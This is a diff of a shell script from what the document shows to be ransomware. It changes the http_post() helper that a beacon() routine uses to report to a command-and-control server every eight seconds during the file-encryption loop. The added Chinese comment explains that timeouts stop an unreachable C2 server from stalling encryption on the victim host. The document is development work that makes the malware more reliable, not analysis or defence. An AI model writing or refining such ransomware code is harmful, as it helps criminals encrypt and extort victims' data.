@@ -46,10 +46,17 @@ sha256_file(){
 
 http_post(){
     # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
+    #
+    # ★ 超时是必须的，不是优化项。
+    # beacon() 在加密主循环里【每 8 秒】调用一次本函数。一旦 C2 不可达
+    # （下线、防火墙、受害主机出口被打满），不带超时的 curl 会一直阻塞在
+    # TCP connect 上——curl 默认连接超时是 300 秒，而 wget 默认还会重试 20 次。
+    # 效果就是：每 8 秒的例行上报变成每 5 分钟一次的长阻塞，整个加密过程停滞。
+    # 这里把单次上报硬限制在 8 秒内（连接 3 秒），失败即返回交由调用方记录。
     if has_cmd curl; then
-        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
+        curl -s -f --connect-timeout 3 --max-time 8 -X POST -d "$2" "$1" >/dev/null 2>&1
     elif has_cmd wget; then
-        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
+        wget -q -O /dev/null --tries=1 --timeout=8 --post-data="$2" "$1" 2>/dev/null
     else
         return 127
     fi
